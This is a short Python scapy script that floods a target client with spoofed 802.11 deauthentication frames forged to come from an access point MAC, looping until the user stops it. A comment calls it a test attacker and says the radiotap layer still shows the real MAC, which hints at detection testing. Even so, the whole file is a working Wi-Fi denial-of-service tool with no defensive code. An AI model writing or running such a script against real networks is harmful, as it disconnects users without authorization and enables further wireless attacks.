from scapy.all import *

# Real test attacker — keep your real MAC at radio layer
target_ap = "40:ae:30:2b:e8:0e"    # Spoofed AP MAC
target_client = "56:78:63:23:53:63"
interface = "wlan0mon"

# Spoofed deauth packet (addr2 = AP MAC), but radiotap reveals real MAC
def spoofed_deauth(ap_mac, client_mac):
    return RadioTap()/Dot11(
        addr1=client_mac,  # Destination
        addr2=ap_mac,      # Spoofed source (AP)
        addr3=ap_mac       # BSSID
    )/Dot11Deauth(reason=7)

print(f"[*] Sending spoofed deauth (AP MAC {target_ap}) to {target_client}")

try:
    while True:
        pkt = spoofed_deauth(target_ap, target_client)
        sendp(pkt, iface=interface, count=5, inter=0.1, verbose=False)
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[!] Stopped by user")
